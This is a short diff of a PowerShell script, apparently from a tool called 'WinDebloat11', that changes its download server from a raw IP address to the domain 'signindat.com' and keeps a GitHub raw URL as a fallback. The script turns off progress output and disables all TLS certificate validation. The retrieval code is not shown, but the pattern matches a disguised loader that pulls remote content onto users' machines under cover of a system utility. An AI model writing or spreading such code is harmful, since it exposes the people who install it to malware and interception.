@@ -2,7 +2,7 @@ $ProgressPreference='SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 
-$srv='https://193.26.115.196'
+$srv='https://signindat.com'
 $gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main'
 $sources=@($srv,$gh)
 
